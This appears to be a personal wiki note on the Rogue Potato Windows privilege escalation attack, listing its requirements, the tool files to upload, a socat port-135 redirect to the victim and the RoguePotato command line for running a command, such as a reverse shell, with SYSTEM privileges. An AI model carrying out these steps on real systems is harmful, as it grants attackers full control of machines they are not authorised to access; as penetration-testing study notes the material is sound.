Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2021-12-02T19:25:22-05:00

====== Rogue Potato ======
Created Thursday 02 December 2021

===== Description =====
This attack is a privilege escalation attack. 

Details unclear, but it will set traffic to port 135 on a machine that is under your control.
This traffic is to be redirected to a listening port back in the target host.
When this all goes through, a command is executed with SYSTEM privs. This can be a reverse shell back to your machine

===== Requirements =====
* You need a machine that is accessible on port 135 from the victim machine. This means that if this port is firewalled, the attack will fail.
* Furthermore, it will open a listening port (9000) that should be accessible. So firewalls should be off!
* SeImpersonate or SeAssignPrimaryToken privs!

===== Steps =====

===== Upload files =====
Upload the following files to the target host
* RogueOxidResolver.exe
* RoguePotato.exe

===== Setup bounce-bounce with socat =====
{{{code: lang="texinfo" linenumbers="False"
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
}}}

* This will receive traffic on port 135 and send it back to target::9999

===== Execute tool =====
{{{code: lang="texinfo" linenumbers="False"
.\RoguePotato.exe -r <ip_of_bounce> -e "command" -l 9999
}}}


===== SEE =====
* https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/
* https://0xdf.gitlab.io/2020/09/08/roguepotato-on-remote.html
* [[Tools:Windows:RoguePotato]]
* [[Tools:Linux:socat]]
* [[Juicy Potato]]
